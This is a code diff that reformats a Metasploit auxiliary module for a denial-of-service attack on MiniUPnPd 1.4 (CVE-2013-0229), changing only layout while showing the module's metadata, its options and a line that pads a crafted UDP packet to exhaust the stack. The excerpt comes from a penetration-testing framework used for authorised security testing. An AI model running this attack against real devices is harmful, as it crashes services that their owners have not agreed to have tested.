@@ -8,33 +8,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
+        'Description' => %q{
           This module allows remote attackers to cause a denial of service (DoS)
           in MiniUPnP 1.0 server via a specifically crafted UDP request.
-      },
-      'Author'         =>
-        [
+        },
+        'Author' => [
           'hdm', # Vulnerability discovery
           'Dejan Lukan' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-0229' ],
           [ 'OSVDB', '89625' ],
           [ 'BID', '57607' ],
           [ 'URL', 'https://community.rapid7.com/servlet/JiveServlet/download/2150-1-16596/SecurityFlawsUPnP.pdf' ]
         ],
-      'DisclosureDate' => '2013-03-27',
-    ))
+        'DisclosureDate' => '2013-03-27',
+      )
+    )
 
     register_options(
-    [
-      Opt::RPORT(1900),
-      OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])
-    ])
+      [
+        Opt::RPORT(1900),
+        OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])
+      ]
+    )
   end
 
   def send_probe(udp_sock, probe)
@@ -64,8 +66,7 @@ class MetasploitModule < Msf::Auxiliary
     # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
     # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
     # characters: there's more chance that the the program will run off the stack.
-    sploit += ' '*(1500-sploit.length)
-
+    sploit += ' ' * (1500 - sploit.length)
 
     # connect to the UDP port
     connect_udp
